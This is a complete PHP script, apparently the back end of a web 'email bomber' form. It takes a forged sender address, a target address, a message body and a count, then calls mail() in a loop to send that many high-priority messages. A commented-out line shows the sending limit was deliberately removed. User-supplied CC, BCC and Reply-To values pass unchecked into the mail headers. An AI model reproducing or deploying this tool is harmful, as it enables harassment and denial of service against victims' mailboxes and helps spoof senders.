<?php

$error = "";
$email_exp = "^[A-Z0-9._%-]+@[A-Z0-9.-]+\.[A-Z]{2,4}$";

if (empty($_POST['fromname'])) {

	$error .= "<br />Please enter a from name."; 

}

if (empty($_POST['frommail'])) {

	$error .= "<br />Please enter a from email."; 

} else {
	
  if(!eregi($email_exp,$_POST['frommail'])) {
    $error .= '<br />Please enter a valid from email.';
  }

}

if (empty($_POST['toemail'])) {

	$error .= "<br />Please enter a to email."; 

} else {
	
  if(!eregi($email_exp,$_POST['toemail'])) {
    $error .= '<br />Please enter a valid to email.';
  }

}

if (empty($_POST['subject'])) {

	$error .= "<br />Please enter a subject."; 

}

if (empty($_POST['bombBody'])) {

	$error .= "<br />Please enter a body."; 

}

if (empty($_POST['amount'])) {

	$error .= "<br />Please enter an amount."; 

} else {
	
  /*if($_POST['amount'] > 99999) {
    $error .= '<br />Please enter an amount under 100,000.';
  }*/

}

if ($error !== "") {
	
	echo "<b><u><font color='red' face='Arial, Helvetica, sans-serif' >Error</font><br /><br /></u></b>";
	die($error);

} else {

	startMailSend();

}

function startMailSend() {
	
	$fromname = $_POST['fromname'];
	$frommail = $_POST['frommail'];
	$replyfrom = $_POST['replyfrom'];
	$toemail = $_POST['toemail'];
	$subject = $_POST['subject'];
	$body = $_POST['bombBody'];
	$amount = $_POST['amount'];
	$cc = $_POST['cc'];
	$bcc = $_POST['bcc'];
	
	$header = "";
	$header .= "MIME-Version: 1.0" . "\r\n";
	$header .= "Content-type: text/html; charset=iso-8859-1" . "\r\n";
	$header .= "From: $frommail" . "\r\n";
	
	if (!empty($cc)) {
	$header .= "CC: $cc" . "\r\n";
	}
	
	if (!empty($bcc)) {
	$header .= "BCC: $bcc" . "\r\n";
	}
	
	if (!empty($replyfrom)) {
	$header .= "Reply-To: $replyfrom" . "\r\n";
	}
	
	$header .= "X-Priority: 1" . "\r\n";
	$header .= "X-MSMail-Priority: High" . "\r\n";
	
	for ($i = 0; $i < $amount; $i++) {
		
		mail ($toemail,$subject,$body,$header);
		
	}
	
	index();

}

function index() {

	header("Location: index.php?ref=done");

}

?>